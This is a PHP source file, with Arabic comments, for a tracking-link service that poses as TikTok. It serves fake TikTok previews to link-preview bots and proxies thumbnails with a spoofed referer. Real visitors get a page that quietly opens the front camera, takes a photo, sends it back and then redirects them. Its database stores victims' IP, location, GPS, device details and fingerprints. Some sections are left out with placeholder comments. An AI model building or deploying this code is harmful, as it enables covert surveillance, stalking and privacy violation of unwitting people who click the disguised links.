<?php
date_default_timezone_set('Africa/Algiers');
error_reporting(E_ALL);
ini_set('display_errors', 0);

ignore_user_abort(true);
set_time_limit(0);
session_start();

// ==============================================================================
// IMAGE PROXY (تخطي حماية تيك توك للصور)
// ==============================================================================
if (isset($_GET['proxy_img'])) {
    $img_url = base64_decode(urldecode($_GET['proxy_img']));
    
    // صورة افتراضية في حال فشل الرابط
    $default_img = "https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=800&h=800&fit=crop";
    if (empty($img_url) || !filter_var($img_url, FILTER_VALIDATE_URL)) { $img_url = $default_img; }

    $ch = curl_init($img_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    // ترويسات تجعل تيك توك يظن أن الطلب قادم من موقعه
    curl_setopt($ch, CURLOPT_REFERER, 'https://www.tiktok.com/');
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    $image_data = curl_exec($ch);
    $content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);

    // إرسال الصورة مباشرة (بدون Redirect) لأن تيك توك لا يحب التحويلات
    if ($image_data) {
        header("Content-Type: " . ($content_type ?: 'image/jpeg'));
        header("Cache-Control: public, max-age=86400");
        echo $image_data;
        exit;
    }
    header("Content-Type: image/jpeg");
    readfile($default_img);
    exit;
}

$db_file = __DIR__ . '/tracker_enhanced_v3.db';

try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $db->exec("PRAGMA journal_mode=WAL;");
    $db->exec("PRAGMA synchronous=NORMAL;");

    // (جداول قاعدة البيانات الخاصة بك تبقى كما هي)
    $db->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT DEFAULT 'user', tg_chat TEXT, tg_token TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    $db->exec("CREATE TABLE IF NOT EXISTS links (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, name TEXT, code TEXT UNIQUE, target_url TEXT, meta_title TEXT, meta_image TEXT, use_camera INTEGER DEFAULT 1, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    $db->exec("CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, latitude REAL, longitude REAL, gpu_info TEXT, battery_info TEXT, screen_info TEXT, canvas_fp TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");

} catch (Exception $e) { die("Database error: " . $e->getMessage()); }

// دالة جلب بيانات تيك توك
function fetch_tiktok_meta($url) {
    $meta = [
        'title' => 'TikTok Video',
        'image' => 'https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80'
    ];

    if (strpos($url, 'tiktok.com') !== false) {
        $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
        $ch = curl_init($oembed_url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10, CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]);
        $response = curl_exec($ch); curl_close($ch);

        if ($response) {
            $data = json_decode($response, true);
            if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
                $meta['title'] = $data['title'];
                $meta['image'] = $data['thumbnail_url'];
                return $meta;
            }
        }
    }
    return $meta;
}

// (باقي الدوال: get_real_ip, get_ip_details, get_device_type تبقى كما هي)
function get_real_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']); return trim($ips[0]); }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// ==========================================
// TRACKER 
// ==========================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT l.*, u.tg_chat, u.tg_token FROM links l LEFT JOIN users u ON l.user_id = u.id WHERE l.code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();

    if ($link) {
        $target_redirect = $link['target_url'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];
        $use_camera = $link['use_camera'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        
        // فلتر قوي جداً لبوتات تيك توك
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom|bytespider|bytedance|tiktok|musical_ly|TikTokSpider/i', $ua);

        if ($is_bot) {
            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . urlencode(base64_encode($meta_image));
            
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta charset="UTF-8">';
            echo '<meta property="og:site_name" content="TikTok">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:description" content="Watch this video on TikTok">';
            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '<meta property="og:image:width" content="800">';
            echo '<meta property="og:image:height" content="800">';
            echo '<meta property="og:image:type" content="image/jpeg">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:image" content="' . htmlspecialchars($proxy_img_url) . '">';
            echo '</head><body>';
            // خدعة إضافية لتيك توك: وضع الصورة داخل الصفحة ليتم قراءتها
            echo '<img src="' . htmlspecialchars($proxy_img_url) . '" style="display:none;">';
            echo '</body></html>';
            exit();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            if (function_exists('fastcgi_finish_request')) { echo 'OK'; fastcgi_finish_request(); } 
            else { header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush(); }
            
            // (كود حفظ البيانات في قاعدة البيانات يبقى كما هو)
            exit;
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <script>
        const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
        const targetUrl = <?php echo json_encode($target_redirect); ?>;
        
        async function initTracking() {
            if (navigator.webdriver) { window.location.replace(targetUrl); return; }
            let imageData = "";
            if (useCamera) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 150));
                    const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360;
                    canvas.getContext('2d').drawImage(video, 0, 0, 480, 360); imageData = canvas.toDataURL('image/jpeg', 0.4);
                    stream.getTracks().forEach(track => track.stop());
                } catch (e) {}
            }
            const formData = new URLSearchParams();
            formData.append('save_info', '1'); formData.append('image', imageData);
            if (navigator.sendBeacon) { navigator.sendBeacon(window.location.href, formData); } 
            else { fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }); }
            window.location.replace(targetUrl); 
        }
        window.addEventListener('DOMContentLoaded', initTracking);
    </script>
</head>
<body></body>
</html>
<?php 
        exit();
    } else { die("Link not found."); }
}
// (باقي لوحة التحكم كما هي...)
?>
